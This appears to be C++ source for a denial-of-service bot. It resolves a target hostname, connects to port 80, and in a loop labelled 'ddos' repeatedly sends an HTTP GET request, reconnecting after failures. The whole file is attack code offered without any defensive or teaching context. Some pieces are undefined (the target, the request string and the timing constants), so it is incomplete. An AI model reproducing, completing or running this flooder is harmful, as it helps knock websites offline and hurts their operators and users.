#include <iostream>
#include <cstring>
#include <ctime>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>

#include <unistd.h>

#include <errno.h>


void initiatebot();

void try_again_later(){
	sleep(ON_ERROR);
}

char* GetIP(const char* dns){
	static char ip[16];
	struct hostent* host=gethostbyname(dns);
	inet_ntop(AF_INET, host->h_addr, ip, 16);
	return ip;
}

int main(){
	int failure=0;
initbot:
	int sock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct sockaddr_in target;

	target.sin_addr.s_addr=inet_addr(GetIP(TARGET));
 	target.sin_port=htons(80);
	target.sin_family=AF_INET;

	if(sock==-1){
errorhandle:
		perror(" ");
		try_again_later();
		goto initbot;
	}

	int cnt=connect(sock, (struct sockaddr*)&target, sizeof(struct sockaddr_in));
	if (cnt==-1){
		close(sock);
		perror(" ");
		goto errorhandle;
	}
ddos:
	while (sleep(WTIME)+1){
		if (send(sock, GET, strlen(GET), IPPROTO_TCP)==-1){
			if (failure++==10){
				perror(" ");
				try_again_later();
				goto initbot;
			}
			goto ddos;
		}
	}
}
